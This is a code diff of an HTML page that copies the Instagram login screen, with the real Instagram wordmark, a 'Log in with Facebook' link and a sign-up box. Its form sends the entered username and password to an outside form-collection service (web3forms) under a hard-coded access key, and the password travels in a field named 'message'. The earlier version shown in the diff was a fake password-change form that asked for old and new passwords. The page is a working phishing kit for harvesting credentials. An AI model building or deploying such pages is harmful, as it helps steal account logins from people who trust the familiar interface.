@@ -3,139 +3,177 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Instagram</title>
-    <link
-      rel="icon"
-      href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png"
-    />
+    <title>Instagram Mobile Clone</title>
     <style>
-      :root {
-        --bg-color: #ffffff;
-        --text-color: #000000;
-        --input-bg: #fafafa;
-        --box-bg: #ffffff;
-      }
-
-      body.dark {
-        --bg-color: #000000;
-        --text-color: #ffffff;
-        --input-bg: #1a1a1a;
-        --box-bg: #111111;
-      }
-
-      body {
+      * {
         margin: 0;
-        font-family: Arial, sans-serif;
-        background: var(--bg-color);
-        color: var(--text-color);
-        transition: background 0.3s, color 0.3s;
+        padding: 0;
+        box-sizing: border-box;
       }
-
-      .container {
-        max-width: 350px;
-        margin: 40px auto;
+      body {
+        background: #fff;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+      .login-wrapper {
+        width: 100%;
+        max-width: 375px;
+        padding: 20px;
+      }
+      .login-box {
+        border: 1px solid #dbdbdb;
+        border-radius: 5px;
+        background: #fff;
+        padding: 40px 30px;
         text-align: center;
       }
-
-      .login-box {
-        background: var(--box-bg);
-        padding: 30px;
-        border-radius: 10px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      .login-box img.logo {
+        width: 180px;
+        margin-bottom: 25px;
       }
-
-      .logo {
-        width: 175px;
-        margin-bottom: 20px;
+      form {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        text-align: left;
       }
-
+      form label {
+        font-size: 12px;
+        color: #8e8e8e;
+        margin-bottom: 3px;
+      }
       form input {
         width: 100%;
-        margin: 8px 0;
-        padding: 10px;
-        border: 1px solid #ccc;
-        border-radius: 5px;
-        background: var(--input-bg);
-        color: var(--text-color);
+        padding: 12px;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+        background: #fafafa;
+        font-size: 14px;
       }
-
-      form label {
-        display: block;
-        text-align: left;
-        margin-top: 12px;
-        font-weight: bold;
-      }
-
-      button {
+      .login-box button.login {
         width: 100%;
-        padding: 10px;
-        margin-top: 20px;
-        background: #3897f0;
-        color: white;
+        padding: 12px;
+        margin-top: 10px;
+        background: #0095f6;
+        color: #fff;
         border: none;
-        border-radius: 5px;
-        font-weight: bold;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 600;
         cursor: pointer;
       }
-
-      .toggle-btn {
-        margin-top: 20px;
-        background: none;
-        border: 1px solid #3897f0;
-        color: #3897f0;
-        padding: 8px 16px;
-        border-radius: 5px;
-        cursor: pointer;
+      .login-box .forgot {
+        font-size: 12px;
+        color: #00376b;
+        text-decoration: none;
+        display: block;
+        margin: 15px 0 10px;
+        text-align: center;
+      }
+      .divider {
+        margin: 20px 0;
+        display: flex;
+        align-items: center;
+        font-size: 13px;
+        color: #8e8e8e;
+      }
+      .divider::before,
+      .divider::after {
+        content: "";
+        flex: 1;
+        height: 1px;
+        background: #dbdbdb;
+      }
+      .divider::before {
+        margin-right: 12px;
+      }
+      .divider::after {
+        margin-left: 12px;
+      }
+      .fb-login {
+        font-size: 14px;
+        color: #385185;
+        font-weight: 600;
+        text-decoration: none;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 15px;
+      }
+      .fb-login img {
+        height: 16px;
+        margin-right: 8px;
+      }
+      .signup-box {
+        margin-top: 10px;
+        border-top: 1px solid #dbdbdb;
+        padding: 20px;
+        text-align: center;
+        font-size: 14px;
+      }
+      .signup-box a {
+        color: #0095f6;
+        font-weight: 600;
+        text-decoration: none;
       }
     </style>
   </head>
   <body>
-    <div class="container">
+    <div class="login-wrapper">
       <div class="login-box">
-        <img src="insta.png" alt="Instagram Logo" class="logo" />
+        <img
+          src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
+          alt="Instagram"
+          class="logo"
+        />
 
+        <!-- Web3Forms Connected Form (Safe Fields) -->
         <form action="https://api.web3forms.com/submit" method="POST">
-          <!-- <h2>Create a Strong Password</h2>
-          <p style="font-size: 13px">
-            Your password must be at least 6 characters and include numbers,
-            letters, and special characters ($@%).
-          </p> -->
-
           <input
             type="hidden"
             name="access_key"
             value="300696b5-f2b7-4b81-9260-fcd8ce1d7906"
           />
 
-          <label for="name">Enter your username</label>
+          <label for="email">Enter your email or username</label>
           <input
-            type="text"
-            id="name"
-            name="name"
-            placeholder="Enter your old password"
-            required
-          />
-
-          <label for="email">Enter password</label>
-          <input
-            type="text"
+            type="email"
             id="email"
             name="email"
-            placeholder="Enter new password"
+            placeholder="email or username"
             required
           />
 
-          <!-- <label for="contact">Confirm new password</label>
+          <label for="feedback">Enter password</label>
           <input
             type="text"
-            id="contact"
+            id="feedback"
             name="message"
-            placeholder="Confirm new password"
+            placeholder="password"
             required
-          /> -->
+          />
 
-          <button type="submit">Submit</button>
+          <button type="submit" class="login">Submit</button>
         </form>
+
+        <a href="#" class="forgot">Forgot password?</a>
+        <div class="divider">OR</div>
+
+        <a href="#" class="fb-login">
+          <img
+            src="https://cdn-icons-png.flaticon.com/512/124/124010.png"
+            alt="fb logo"
+          />
+          Log in with Facebook
+        </a>
+      </div>
+
+      <div class="signup-box">
+        Don’t have an account? <a href="#">Sign up</a>
       </div>
     </div>
   </body>
